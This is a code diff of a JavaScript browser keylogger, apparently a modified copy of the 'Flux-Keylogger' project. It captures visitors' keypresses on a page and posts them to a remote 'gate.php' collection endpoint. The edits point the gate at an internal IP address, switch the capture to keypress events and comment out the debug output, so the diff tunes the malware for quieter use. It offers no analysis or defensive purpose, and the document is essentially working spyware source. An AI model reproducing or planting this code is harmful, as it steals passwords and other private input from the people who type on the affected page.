@@ -1,16 +1,17 @@
 // https://github.com/LimerBoy/Flux-Keylogger/
 
 // Settings
-var fluxGate = "http://localhost:80/gate.php";
+var fluxGate    = "http://10.18.14.22/gate.php";
 var sendTimeout = 4000;
 
 
 // KEYLOGGER
 var keys = "";
-document.addEventListener("keydown", function(e) {
+document.addEventListener("keypress", function(e) {
 	keyCode = e.keyCode;
 	keyName = e.key;
-	console.log(keyCode);
+	// console.log(keyName);
+	// alert("Name: " + keyName + " code: " + keyCode);
 	// Check key
 	switch(keyCode) {
 		// ENTER
@@ -41,11 +42,11 @@ function saveAll() {
 
 	// Check for new data
 	if (old == keys.length) {
-		//console.log("not sending..")
+		// not send
 		return "";
 	} else {
+		// send
 		old = keys.length;
-		//console.log("sending..")
 	}
 
 	var time     = date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds();
